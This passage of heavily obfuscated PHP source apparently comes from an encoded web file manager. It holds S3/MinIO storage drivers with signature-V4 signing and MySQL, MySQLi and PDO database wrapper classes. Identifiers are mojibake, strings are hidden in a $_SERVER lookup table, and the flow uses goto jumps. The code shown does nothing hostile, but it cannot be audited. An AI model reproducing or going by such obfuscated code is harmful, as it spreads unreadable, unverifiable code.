$›ƒ²„Ë, $ŸŞŸâÀ»); if (!$Ññ£‹Ñ¥) { return !1; } $šã—Á´Ò = $¥ôµ©Ï[298]; foreach ($Ññ£‹Ñ¥ as $È ú·îÌ) { $šã—Á´Ò .= $¥ôµ©Ï[299] . "\74\120\141\162\164\x4e\x75\155\x62\145\162\x3e{$È ú·îÌ[$¥ôµ©Ï[300]]}\x3c\57\x50\141\162\x74\x4e\165\155\x62\145\162\x3e\12" . "\x3c\x45\x54\x61\147\x3e{$È ú·îÌ[$¥ôµ©Ï[301]]}\x3c\x2f\x45\124\x61\147\x3e\12" . $¥ôµ©Ï[302]; } $šã—Á´Ò .= $¥ôµ©Ï[303]; $‹½ºÆùÏ = array($¥ôµ©Ï[276] => gmdate($¥ôµ©Ï[283]), $¥ôµ©Ï[293] => hash($¥ôµ©Ï[278], $šã—Á´Ò)); $¯’Èå’ = explode($¥ôµ©Ï[211], $this->getHost()); $´ÍË—ıƒ = array($¥ôµ©Ï[295] => $¯’Èå’[1], $¥ôµ©Ï[249] => $¥ôµ©Ï[123], $¥ôµ©Ï[297] => strlen($šã—Á´Ò)); $±Ÿ“ğ = $¥ôµ©Ï[291]; $–îõíÔñ = $¥ôµ©Ï[8] . $this->pathEncode($›ƒ²„Ë); $®éĞ×Îì = array($¥ôµ©Ï[284] => $ŸŞŸâÀ»); $®Õºæñç = $this->client->__getSignatureV4($‹½ºÆùÏ, $´ÍË—ıƒ, $±Ÿ“ğ, $–îõíÔñ, $®éĞ×Îì); return array($¥ôµ©Ï[289] => $®Õºæñç, $¥ôµ©Ï[293] => $‹½ºÆùÏ[$¥ôµ©Ï[293]], $¥ôµ©Ï[285] => $‹½ºÆùÏ[$¥ôµ©Ï[276]], $¥ôµ©Ï[292] => $Ññ£‹Ñ¥); } private function _isClientAsync() { $„Ø›‹ËÌ =& $_SERVER[äô®•½Â]; static $Šä­ËÕÉ = null; if ($Šä­ËÕÉ === null) { $Š¹ÑÂÎ¨ = isset($_REQUEST[$„Ø›‹ËÌ[304]]) ? json_decode($_REQUEST[$„Ø›‹ËÌ[304]], !0) : !1; $Šä­ËÕÉ = $Š¹ÑÂÎ¨ && _get($Š¹ÑÂÎ¨, $„Ø›‹ËÌ[305]) == $„Ø›‹ËÌ[306]; } return $Šä­ËÕÉ; } public function getHost() { $°²æà– =& $_SERVER[äô®•½Â]; $ğë‹Í†È = parent::getHost(); if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($°²æà–[70], $°²æà–[64], $°²æà–[69], $°²æà–[62]))) { return $ğë‹Í†È . $°²æà–[8] . $this->bucket; } if ($this->osType == $°²æà–[62] && !is_domain($ğë‹Í†È)) { return $ğë‹Í†È . $°²æà–[8] . $this->bucket; } $ğë‹Í†È = explode($°²æà–[211], $ğë‹Í†È); return $ğë‹Í†È[0] . $°²æà–[211] . $this->bucket . $°²æà–[10] . $ğë‹Í†È[1]; } public function size($Ëõ†ŞƒÊ) { $ª°°§¶ö = $this->objectMeta($Ëõ†ŞƒÊ); return $ª°°§¶ö ? $ª°°§¶ö[$_SERVER[äô®•½Â][79]] : 0; } public function info($â½î§Ï) { if ($this->isFolder($â½î§Ï)) { return $this->folderInfo($â½î§Ï); } else { if ($this->isFile($â½î§Ï)) { return $this->fileInfo($â½î§Ï); } } return !1; } public function exist($¢«÷Ú¨ú) { return $this->isFile($¢«÷Ú¨ú) || $this->isFolder($¢«÷Ú¨ú); } public function isFile($œ¾º¬û¥) { return !$this->isFolder($œ¾º¬û¥) && $this->objectMeta($œ¾º¬û¥); } public function isFolder($ÄùãÜš) { return $this->cacheMethod($_SERVER[äô®•½Â][180], $ÄùãÜš); } protected function objectMeta($Àúî…¢) { return $this->cacheMethod($_SERVER[äô®•½Â][182], $Àúî…¢); } protected function _objectMeta($–‡¦à‚¬) { $ã÷áßŸÀ =& $_SERVER[äô®•½Â]; $–‡¦à‚¬ = rtrim($–‡¦à‚¬, $ã÷áßŸÀ[8]); try { $÷ùÔö—§ = $this->client->getObjectInfo($this->bucket, $–‡¦à‚¬); if (!isset($÷ùÔö—§[$ã÷áßŸÀ[255]]) && isset($÷ùÔö—§[$ã÷áßŸÀ[307]])) { $÷ùÔö—§[$ã÷áßŸÀ[255]] = $÷ùÔö—§[$ã÷áßŸÀ[307]]; } } catch (Exception $‡»ÁÎ±) { $÷ùÔö—§ = !1; } if (!$÷ùÔö—§) { } return $÷ùÔö—§; } protected function _isFolder($†öİ¯ëğ) { $íˆÕ°‘÷ =& $_SERVER[äô®•½Â]; $†öİ¯ëğ = rtrim($†öİ¯ëğ, $íˆÕ°‘÷[8]) . $íˆÕ°‘÷[8]; if ($†öİ¯ëğ == $íˆÕ°‘÷[12] || $†öİ¯ëğ == $íˆÕ°‘÷[8]) { return !0; } $Ç ˆ¶§Š = $this->client->getBucket($this->bucket, $†öİ¯ëğ, null, 1); if (empty($Ç ˆ¶§Š[$íˆÕ°‘÷[239]])) { return !1; } $“™üß›” = $Ç ˆ¶§Š[$íˆÕ°‘÷[239]][0][$íˆÕ°‘÷[32]]; return stripos($“™üß›”, $†öİ¯ëğ) === 0 ? !0 : !1; if (substr($“™üß›”, -1) == $íˆÕ°‘÷[8]) { return !0; } if (get_path_this($“™üß›”) == get_path_this($†öİ¯ëğ)) { return !1; } return !0; } public function listObject($–ã•ä¹Ù) { return $this->fileList($–ã•ä¹Ù, $_SERVER[äô®•½Â][12], !0); } } class PathDriverMinIO extends PathDriverBaseS3 { public function __construct($ëæ¶¿Üó) { $´¼ï×« =& $_SERVER[äô®•½Â]; parent::__construct($ëæ¶¿Üó); $this->setSignVersion($´¼ï×«[250]); if (!$this->region) { $this->region = $´¼ï×«[308]; $this->client->setRegion($this->region); } $this->client->setHeadValid(!1); } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function checkRegion() { $ »çÁÆÎ = $this->getBktRegion(); return $this->region == $ »çÁÆÎ ? !0 : !1; } public function uploadFormData($Òí‡‘æó, $Éõ¢’ÉË = 3600) { $úùĞÃé˜ =& $_SERVER[äô®•½Â]; $œİàÊ¿À = $úùĞÃé˜[232]; $ıËµÄŠ = $úùĞÃé˜[260]; $á˜ƒ»¢¸ = $úùĞÃé˜[62]; $ÛÂ¶Ä•À = gmdate($úùĞÃé˜[261]); $‹¾ä® © = gmdate($úùĞÃé˜[262]); $ÖµÑÚŒ¯ = $úùĞÃé˜[263]; $æ­¨ª¾ = $Éõ¢’ÉË . $úùĞÃé˜[12]; $ÑÌüÒŸø = $úùĞÃé˜[264]; $Ìƒ÷ñÜ = array($this->accessKey, $‹¾ä® ©, $this->region, $á˜ƒ»¢¸, $ÖµÑÚŒ¯); $ùûç Ã = implode($úùĞÃé˜[8], $Ìƒ÷ñÜ); $—Û‘°å = array($úùĞÃé˜[265] => gmdate($úùĞÃé˜[266], strtotime($úùĞÃé˜[267])), $úùĞÃé˜[268] => array(array($úùĞÃé˜[269] => $this->bucket), array($úùĞÃé˜[309] => $œİàÊ¿À), array($úùĞÃé˜[270], $úùĞÃé˜[271], $úùĞÃé˜[12]), array($úùĞÃé˜[270], $úùĞÃé˜[272], $úùĞÃé˜[12]), array($úùĞÃé˜[270], $úùĞÃé˜[310], $úùĞÃé˜[12]), array($úùĞÃé˜[273] => $ÑÌüÒŸø), array($úùĞÃé˜[274] => $ùûç Ã), array($úùĞÃé˜[275] => $ıËµÄŠ), array($úùĞÃé˜[276] => $ÛÂ¶Ä•À), array($úùĞÃé˜[277] => $æ­¨ª¾))); $«©·¯¼ = base64_encode(json_encode($—Û‘°å)); $¶®ß¬Ò = hash_hmac($úùĞÃé˜[278], $‹¾ä® ©, $úùĞÃé˜[279] . $this->secret, !0); $ø¬Ğ¼ç— = hash_hmac($úùĞÃé˜[278], $this->region, $¶®ß¬Ò, !0); $æÍş±Ïæ = hash_hmac($úùĞÃé˜[278], $á˜ƒ»¢¸, $ø¬Ğ¼ç—, !0); $Ÿ²Ò‹ó = hash_hmac($úùĞÃé˜[278], $ÖµÑÚŒ¯, $æÍş±Ïæ, !0); $‰Ú÷Óº = hash_hmac($úùĞÃé˜[278], $«©·¯¼, $Ÿ²Ò‹ó); $Öıè¶£Ù = array($úùĞÃé˜[249] => $úùĞÃé˜[12], $úùĞÃé˜[297] => $úùĞÃé˜[12], $úùĞÃé˜[309] => $œİàÊ¿À, $úùĞÃé˜[273] => $ÑÌüÒŸø, $úùĞÃé˜[280] => $«©·¯¼, $úùĞÃé˜[311] => $ùûç Ã, $úùĞÃé˜[312] => $ıËµÄŠ, $úùĞÃé˜[313] => $ÛÂ¶Ä•À, $úùĞÃé˜[314] => $æ­¨ª¾, $úùĞÃé˜[315] => $‰Ú÷Óº, $úùĞÃé˜[209] => $this->getHost()); return $Öıè¶£Ù; } } goto B×Ïñƒ®‚§; B×Ïñƒ®‚§: class PathDriverS3 extends PathDriverBaseS3 { public function __construct($õ—„ğ¾Ë) { $§Ğº«Èç =& $_SERVER[äô®•½Â]; parent::__construct($õ—„ğ¾Ë); $Ïİ³ÎûÂ = isset($õ—„ğ¾Ë[$§Ğº«Èç[259]]) && $õ—„ğ¾Ë[$§Ğº«Èç[259]] == $§Ğº«Èç[250] ? $§Ğº«Èç[250] : $§Ğº«Èç[316]; $this->setSignVersion($Ïİ³ÎûÂ); } public function link($ –Óì¢, $àáò¶´š = array()) { return parent::link($ –Óì¢, $àáò¶´š); } public function fileOut($Ö‘ˆâ•œ, $íÖ›Äò = false, $¶ÎÃ«×¦ = false, $Ç®ş®ßÆ = '') { if ($this->isFileOutServer() || strstr($this->endpoint, $_SERVER[äô®•½Â][317])) { return parent::fileOutServer($Ö‘ˆâ•œ, $íÖ›Äò, $¶ÎÃ«×¦, $Ç®ş®ßÆ); } parent::fileOut($Ö‘ˆâ•œ, $íÖ›Äò, $¶ÎÃ«×¦, $Ç®ş®ßÆ); } public function fileOutImage($ÈçäÑ¨£, $ğ‘ûµê = 250) { if (strstr($this->endpoint, $_SERVER[äô®•½Â][317])) { return parent::fileOutImageServer($ÈçäÑ¨£, $ğ‘ûµê); } parent::fileOutImage($ÈçäÑ¨£, $ğ‘ûµê); } } define($_SERVER[äô®•½Â][318], 1); define($_SERVER[äô®•½Â][319], 2); goto A¥ñÅ“ØÏÈ; eÏ¼× ÷Ñ¾: class DbMysql extends Db { public function __construct($¯ßö˜×ğ = '') { $Ÿ£¹õë =& $_SERVER[äô®•½Â]; if (!extension_loaded($Ÿ£¹õë[874])) { think_exception(think_lang($Ÿ£¹õë[14]) . $Ÿ£¹õë[957]); } if (!empty($¯ßö˜×ğ)) { $this->config = $¯ßö˜×ğ; if (empty($this->config[$Ÿ£¹õë[17]])) { $this->config[$Ÿ£¹õë[17]] = $Ÿ£¹õë[12]; } } } public function connect($­Ü°Æ‡¿ = '', $ò¶æ¢×í = 0, $ ©æ™Ø· = false) { $è˜’Šê =& $_SERVER[äô®•½Â]; if (!isset($this->linkID[$ò¶æ¢×í])) { if (empty($­Ü°Æ‡¿)) { $­Ü°Æ‡¿ = $this->config; } $ÎÎ†ıÄ¬ = $­Ü°Æ‡¿[$è˜’Šê[958]] . ($­Ü°Æ‡¿[$è˜’Šê[959]] ? "\72{$­Ü°Æ‡¿[$è˜’Šê[959]]}" : $è˜’Šê[12]); $¨ÑÅæ‡ = !empty($­Ü°Æ‡¿[$è˜’Šê[17]][$è˜’Šê[18]]) ? $­Ü°Æ‡¿[$è˜’Šê[17]][$è˜’Šê[18]] : $this->pconnect; if ($¨ÑÅæ‡) { $this->linkID[$ò¶æ¢×í] = mysql_pconnect($ÎÎ†ıÄ¬, $­Ü°Æ‡¿[$è˜’Šê[960]], $­Ü°Æ‡¿[$è˜’Šê[961]], 131072); } else { $this->linkID[$ò¶æ¢×í] = mysql_connect($ÎÎ†ıÄ¬, $­Ü°Æ‡¿[$è˜’Šê[960]], $­Ü°Æ‡¿[$è˜’Šê[961]], !0, 131072); } if (!$this->linkID[$ò¶æ¢×í] || !empty($­Ü°Æ‡¿[$è˜’Šê[21]]) && !mysql_select_db($­Ü°Æ‡¿[$è˜’Šê[21]], $this->linkID[$ò¶æ¢×í])) { think_exception(mysql_error()); } $ Á’†íû = mysql_get_server_info($this->linkID[$ò¶æ¢×í]); mysql_query($è˜’Šê[962] . think_config($è˜’Šê[963]) . $è˜’Šê[58], $this->linkID[$ò¶æ¢×í]); if ($ Á’†íû > $è˜’Šê[964]) { mysql_query($è˜’Šê[965], $this->linkID[$ò¶æ¢×í]); } $this->connected = !0; if (1 != think_config($è˜’Šê[22])) { unset($this->config); } } return $this->linkID[$ò¶æ¢×í]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($é×å©à) { $›ìØ¥„Å =& $_SERVER[äô®•½Â]; if (0 === stripos($é×å©à, $›ìØ¥„Å[353])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $é×å©à; if ($this->queryID) { $this->free(); } think_action_status($›ìØ¥„Å[23], 1); think_status($›ìØ¥„Å[24]); $this->queryID = mysql_query($é×å©à, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($õ€ş¶èæ) { $º±ü¥ ” =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $õ€ş¶èæ; if ($this->queryID) { $this->free(); } think_action_status($º±ü¥ ”[25], 1); think_status($º±ü¥ ”[24]); $öª¨ĞßÎ = mysql_query($õ€ş¶èæ, $this->_linkID); $this->debug(); if (!1 === $öª¨ĞßÎ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[äô®•½Â][966], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $»Éù›İ = mysql_query($_SERVER[äô®•½Â][967], $this->_linkID); $this->transTimes = 0; if (!$»Éù›İ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $‚µÆèÜ = mysql_query($_SERVER[äô®•½Â][968], $this->_linkID); $this->transTimes = 0; if (!$‚µÆèÜ) { $this->error(); return !1; } } return !0; } private function getAll() { $Ğ‹…êô = array(); if ($this->numRows > 0) { while ($É–Ú²™¶ = mysql_fetch_assoc($this->queryID)) { $Ğ‹…êô[] = $É–Ú²™¶; } mysql_data_seek($this->queryID, 0); } return $Ğ‹…êô; } public function getFields($ê…ó¯) { $ÑêïãÏ¨ =& $_SERVER[äô®•½Â]; $èÉ¤¤£™ = $this->query($ÑêïãÏ¨[969] . $this->parseKey($ê…ó¯)); $–Çúª = array(); if ($èÉ¤¤£™) { foreach ($èÉ¤¤£™ as $Î¡€¡ÒÚ => $‚öœö–Ô) { $–Çúª[$‚öœö–Ô[$ÑêïãÏ¨[31]]] = array($ÑêïãÏ¨[32] => $‚öœö–Ô[$ÑêïãÏ¨[31]], $ÑêïãÏ¨[33] => $‚öœö–Ô[$ÑêïãÏ¨[34]], $ÑêïãÏ¨[35] => (bool) (strtoupper($‚öœö–Ô[$ÑêïãÏ¨[36]]) === $ÑêïãÏ¨[970]), $ÑêïãÏ¨[37] => $‚öœö–Ô[$ÑêïãÏ¨[38]], $ÑêïãÏ¨[39] => strtolower($‚öœö–Ô[$ÑêïãÏ¨[40]]) == $ÑêïãÏ¨[41], $ÑêïãÏ¨[42] => strtolower($‚öœö–Ô[$ÑêïãÏ¨[43]]) == $ÑêïãÏ¨[44]); } } return $–Çúª; } public function getTables($‹çí’ÜÓ = '') { $ÉË¯ã– =& $_SERVER[äô®•½Â]; if (!empty($‹çí’ÜÓ)) { $àÔ„ûÎí = $ÉË¯ã–[971] . $‹çí’ÜÓ . $ÉË¯ã–[972]; } else { $àÔ„ûÎí = $ÉË¯ã–[973]; } $ƒ½ÛÍìß = $this->query($àÔ„ûÎí); $å¯˜Ÿ“Ë = array(); foreach ($ƒ½ÛÍìß as $÷ïæ½ƒà => $—Ó°ˆ¡…) { $å¯˜Ÿ“Ë[$÷ïæ½ƒà] = current($—Ó°ˆ¡…); } return $å¯˜Ÿ“Ë; } public function replace($Õû¼È²Œ, $×‹µˆ® = array()) { $±ßõ˜üî =& $_SERVER[äô®•½Â]; foreach ($Õû¼È²Œ as $£¤ÆšÄÍ => $·Ğ·Æıœ) { $œ…®ÖÂ§ = $this->parseValue($·Ğ·Æıœ); if (is_scalar($œ…®ÖÂ§)) { $–î„“êŠ[] = $œ…®ÖÂ§; $Á‡ª©İ[] = $this->parseKey($£¤ÆšÄÍ); } } $õÑ«úøİ = $±ßõ˜üî[974] . $this->parseTable($×‹µˆ®[$±ßõ˜üî[368]]) . $±ßõ˜üî[975] . implode($±ßõ˜üî[50], $Á‡ª©İ) . $±ßõ˜üî[976] . implode($±ßõ˜üî[50], $–î„“êŠ) . $±ßõ˜üî[977]; return $this->execute($õÑ«úøİ); } public function insertAll($£¢ĞİÁ, $öàÜ„Å = array(), $‹¦½ö·÷ = false) { $ïçï™Øï =& $_SERVER[äô®•½Â]; if (!is_array($£¢ĞİÁ[0])) { return !1; } $îÃíÛåî = array_keys($£¢ĞİÁ[0]); $«šÊè¬Ì = array(); foreach ($£¢ĞİÁ as $‹ø’é­™) { $êê¢èÅê = array(); foreach ($‹ø’é­™ as $šÅ‚‰² => $â‘€»») { $â‘€»» = $this->parseValue($â‘€»»); if (is_scalar($â‘€»»)) { $êê¢èÅê[] = $â‘€»»; } } $«šÊè¬Ì[] = $ïçï™Øï[349] . implode($ïçï™Øï[50], $êê¢èÅê) . $ïçï™Øï[977]; } array_walk($îÃíÛåî, array($this, $ïçï™Øï[978])); $àö¨¥¥· = ($‹¦½ö·÷ ? $ïçï™Øï[979] : $ïçï™Øï[980]) . $ïçï™Øï[981] . $this->parseTable($öàÜ„Å[$ïçï™Øï[368]]) . $ïçï™Øï[975] . implode($ïçï™Øï[50], $îÃíÛåî) . $ïçï™Øï[982] . implode($ïçï™Øï[50], $«šÊè¬Ì); return $this->execute($àö¨¥¥·); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $ßÛ¢š†Ø =& $_SERVER[äô®•½Â]; $this->error = mysql_errno() . $ßÛ¢š†Ø[4] . mysql_error($this->_linkID); if ($ßÛ¢š†Ø[12] != $this->queryStr) { $this->error .= LNG($ßÛ¢š†Ø[48]) . $this->queryStr; } think_trace($this->error, $ßÛ¢š†Ø[12], $ßÛ¢š†Ø[49]); return $this->error; } public function escapeString($”ıƒµ») { if ($this->_linkID) { return mysql_real_escape_string($”ıƒµ», $this->_linkID); } else { return mysql_escape_string($”ıƒµ»); } } public function parseKey(&$Ç»îı¢¡, $Ğà™òÙˆ = true) { $ç…ª”ßô =& $_SERVER[äô®•½Â]; if ($Ğà™òÙˆ) { $Ç»îı¢¡ = $this->parseKeyCheck($Ç»îı¢¡); } if ($Ç»îı¢¡ != $ç…ª”ßô[223] && !preg_match($ç…ª”ßô[983], $Ç»îı¢¡)) { $Ç»îı¢¡ = $ç…ª”ßô[472] . trim($Ç»îı¢¡, $ç…ª”ßô[472]) . $ç…ª”ßô[472]; } return $Ç»îı¢¡; } } class DbMysqli extends Db { public function __construct($™ëÌš¶« = '') { $½»“Ï­½ =& $_SERVER[äô®•½Â]; if (!extension_loaded($½»“Ï­½[984])) { think_exception(think_lang($½»“Ï­½[14]) . $½»“Ï­½[985]); } if (!empty($™ëÌš¶«)) { $this->config = $™ëÌš¶«; if (empty($this->config[$½»“Ï­½[17]])) { $this->config[$½»“Ï­½[17]] = $½»“Ï­½[12]; } } } public function connect($ŸÊ“Ùöú = '', $ú›–•é± = 0) { $Ü·Ş—Ì =& $_SERVER[äô®•½Â]; if (!isset($this->linkID[$ú›–•é±])) { if (empty($ŸÊ“Ùöú)) { $ŸÊ“Ùöú = $this->config; } $this->linkID[$ú›–•é±] = new mysqli($ŸÊ“Ùöú[$Ü·Ş—Ì[958]], $ŸÊ“Ùöú[$Ü·Ş—Ì[960]], $ŸÊ“Ùöú[$Ü·Ş—Ì[961]], $ŸÊ“Ùöú[$Ü·Ş—Ì[21]], $ŸÊ“Ùöú[$Ü·Ş—Ì[959]] ? intval($ŸÊ“Ùöú[$Ü·Ş—Ì[959]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $Å¥¹×‘‹ = $this->linkID[$ú›–•é±]->server_version; $this->linkID[$ú›–•é±]->query($Ü·Ş—Ì[962] . think_config($Ü·Ş—Ì[963]) . $Ü·Ş—Ì[58]); if ($Å¥¹×‘‹ > $Ü·Ş—Ì[964]) { $this->linkID[$ú›–•é±]->query($Ü·Ş—Ì[965]); } $this->connected = !0; if (1 != think_config($Ü·Ş—Ì[22])) { unset($this->config); } } return $this->linkID[$ú›–•é±]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($¨ƒ£Û¸Ó) { $˜ÈÇ±áÂ =& $_SERVER[äô®•½Â]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $¨ƒ£Û¸Ó; if ($this->queryID) { $this->free(); } think_action_status($˜ÈÇ±áÂ[23], 1); think_status($˜ÈÇ±áÂ[24]); $this->queryID = $this->_linkID->query($¨ƒ£Û¸Ó); if ($this->_linkID->more_results()) { while (($Áõãğ°ó = $this->_linkID->next_result()) != NULL) { $Áõãğ°ó->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($ï¥«Ò¶) { $·öè¹­Ê =& $_SERVER[äô®•½Â]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $ï¥«Ò¶; if ($this->queryID) { $this->free(); } think_action_status($·öè¹­Ê[25], 1); think_status($·öè¹­Ê[24]); $¦ç¨û£ü = $this->_linkID->query($ï¥«Ò¶); $this->debug(); if (!1 === $¦ç¨û£ü) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $ã“Ì’ğ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$ã“Ì’ğ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $»…¬†§ö = $this->_linkID->rollback(); $this->transTimes = 0; if (!$»…¬†§ö) { $this->error(); return !1; } } return !0; } private function getAll() { $“‰¬÷èœ = array(); if ($this->numRows > 0) { for ($Ò£§¾ı­ = 0; $Ò£§¾ı­ < $this->numRows; $Ò£§¾ı­++) { $“‰¬÷èœ[$Ò£§¾ı­] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $“‰¬÷èœ; } public function getFields($ùš½úïÑ) { $ê¦ÂÑö« =& $_SERVER[äô®•½Â]; $­˜­Ø¦ = $this->query($ê¦ÂÑö«[969] . $this->parseKey($ùš½úïÑ)); $¨ôÍ¡‰‚ = array(); if ($­˜­Ø¦) { foreach ($­˜­Ø¦ as $İÜ´®Óˆ => $ÀïÎ½åÈ) { $¨ôÍ¡‰‚[$ÀïÎ½åÈ[$ê¦ÂÑö«[31]]] = array($ê¦ÂÑö«[32] => $ÀïÎ½åÈ[$ê¦ÂÑö«[31]], $ê¦ÂÑö«[33] => $ÀïÎ½åÈ[$ê¦ÂÑö«[34]], $ê¦ÂÑö«[35] => (bool) ($ÀïÎ½åÈ[$ê¦ÂÑö«[36]] === $ê¦ÂÑö«[12]), $ê¦ÂÑö«[37] => $ÀïÎ½åÈ[$ê¦ÂÑö«[38]], $ê¦ÂÑö«[39] => strtolower($ÀïÎ½åÈ[$ê¦ÂÑö«[40]]) == $ê¦ÂÑö«[41], $ê¦ÂÑö«[42] => strtolower($ÀïÎ½åÈ[$ê¦ÂÑö«[43]]) == $ê¦ÂÑö«[44]); } } return $¨ôÍ¡‰‚; } public function getTables($™òËã·– = '') { $ÅÁÌ±ËÚ =& $_SERVER[äô®•½Â]; $€Ÿ½‡‰ = !empty($™òËã·–) ? $ÅÁÌ±ËÚ[971] . $™òËã·– . $ÅÁÌ±ËÚ[972] : $ÅÁÌ±ËÚ[973]; $ä»¼ÈàÉ = $this->query($€Ÿ½‡‰); $¥©šÉœï = array(); if ($ä»¼ÈàÉ) { foreach ($ä»¼ÈàÉ as $˜Êñ°³Æ => $ÉìŞöÕö) { $¥©šÉœï[$˜Êñ°³Æ] = current($ÉìŞöÕö); } } return $¥©šÉœï; } public function replace($ãšáª, $´Ö¡ßÙá = array()) { $é¿„Æ¼¡ =& $_SERVER[äô®•½Â]; foreach ($ãšáª as $İãç®´˜ => $Ö²ÛÁş«) { $·€ ûøï = $this->parseValue($Ö²ÛÁş«); if (is_scalar($·€ ûøï)) { $±Íù´Š¨[] = $·€ ûøï; $™” ê¡‡[] = $this->parseKey($İãç®´˜); } } $¥şøú© = $é¿„Æ¼¡[974] . $this->parseTable($´Ö¡ßÙá[$é¿„Æ¼¡[368]]) . $é¿„Æ¼¡[975] . implode($é¿„Æ¼¡[50], $™” ê¡‡) . $é¿„Æ¼¡[976] . implode($é¿„Æ¼¡[50], $±Íù´Š¨) . $é¿„Æ¼¡[977]; return $this->execute($¥şøú©); } public function insertAll($ïãÖ˜ìç, $ĞÎ—ı§å = array(), $Ìï×Ê§ï = false) { $¬Ï²°š˜ =& $_SERVER[äô®•½Â]; if (!is_array($ïãÖ˜ìç[0])) { return !1; } $ãÍ‚àå¨ = array_keys($ïãÖ˜ìç[0]); $èó†®— = array(); foreach ($ïãÖ˜ìç as $»«£¿×ê) { $úºñÔ  = array(); foreach ($»«£¿×ê as $ÄÃƒáš  => $š«»ıÊœ) { $š«»ıÊœ = $this->parseValue($š«»ıÊœ); if (is_scalar($š«»ıÊœ)) { $úºñÔ [] = $š«»ıÊœ; } } $èó†®—[] = $¬Ï²°š˜[349] . implode($¬Ï²°š˜[50], $úºñÔ ) . $¬Ï²°š˜[977]; } array_walk($ãÍ‚àå¨, array($this, $¬Ï²°š˜[978])); $ê „¸Ì = $Ìï×Ê§ï ? $¬Ï²°š˜[979] : $¬Ï²°š˜[980]; $×»ü€ì„ = $ê „¸Ì . $¬Ï²°š˜[981] . $this->parseTable($ĞÎ—ı§å[$¬Ï²°š˜[368]]) . $¬Ï²°š˜[975] . implode($¬Ï²°š˜[50], $ãÍ‚àå¨) . $¬Ï²°š˜[982] . implode($¬Ï²°š˜[50], $èó†®—); return $this->execute($×»ü€ì„); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $ÖèğÜçƒ =& $_SERVER[äô®•½Â]; $this->error = $this->_linkID->errno . $ÖèğÜçƒ[4] . $this->_linkID->error; if ($ÖèğÜçƒ[12] != $this->queryStr) { $this->error .= LNG($ÖèğÜçƒ[48]) . $this->queryStr; } think_trace($this->error, $ÖèğÜçƒ[12], $ÖèğÜçƒ[49]); return $this->error; } public function escapeString($ÔŞò˜œÁ) { if ($this->_linkID) { return $this->_linkID->real_escape_string($ÔŞò˜œÁ); } else { return addslashes($ÔŞò˜œÁ); } } public function parseKey(&$Â§ÈÖ„£, $§¥Ÿ‰• = true) { $°³µ×ö =& $_SERVER[äô®•½Â]; if ($§¥Ÿ‰•) { $Â§ÈÖ„£ = $this->parseKeyCheck($Â§ÈÖ„£); } if ($Â§ÈÖ„£ != $°³µ×ö[223] && !preg_match($°³µ×ö[983], $Â§ÈÖ„£)) { $Â§ÈÖ„£ = $°³µ×ö[472] . trim($Â§ÈÖ„£, $°³µ×ö[472]) . $°³µ×ö[472]; } return $Â§ÈÖ„£; } } class DbPdo extends Db { protected $PDOStatement = null; private $table = ''; public function __construct($Ÿç’¨ƒ± = '') { $Ø‡õƒÒ› =& $_SERVER[äô®•½Â]; if (!class_exists($Ø‡õƒÒ›[986])) { think_exception(think_lang($Ø‡õƒÒ›[14]) . $Ø‡õƒÒ›[987]); } if (!empty($Ÿç’¨ƒ±)) { $this->config = $Ÿç’¨ƒ±; if (empty($this->config[$Ø‡õƒÒ›[17]])) { $this->config[$Ø‡õƒÒ›[17]] = array(); } } } public function connect($†ŠŒ¤áü = '', $ÍÓ”¦è = 0) { $»‰°ÁŞ¼ =& $_SERVER[äô®•½Â]; if (!isset($this->linkID[$ÍÓ”¦è])) { if (empty($†ŠŒ¤áü)) { $†ŠŒ¤áü = $this->config; } $©±ÃÕ¢‡ = !empty($†ŠŒ¤áü[$»‰°ÁŞ¼[17]][$»‰°ÁŞ¼[18]]) ? $†ŠŒ¤áü[$»‰°ÁŞ¼[17]][$»‰°ÁŞ¼[18]] : $this->pconnect; if ($©±ÃÕ¢‡) { $†ŠŒ¤áü[$»‰°ÁŞ¼[17]][PDO::ATTR_PERSISTENT] = !0; } try { $this->linkID[$ÍÓ”¦è] = new PDO($†ŠŒ¤áü[$»‰°ÁŞ¼[988]], $†ŠŒ¤áü[$»‰°ÁŞ¼[960]], $†ŠŒ¤áü[$»‰°ÁŞ¼[961]], $†ŠŒ¤áü[$»‰°ÁŞ¼[17]]); } catch (PDOException $ù›¹¯êµ) { think_exception($ù›¹¯êµ->getMessage()); } $this->dbType = $this->_getDsnType($†ŠŒ¤áü[$»‰°ÁŞ¼[988]]); if (in_array($this->dbType, array($»‰°ÁŞ¼[989], $»‰°ÁŞ¼[990], $»‰°ÁŞ¼[991], 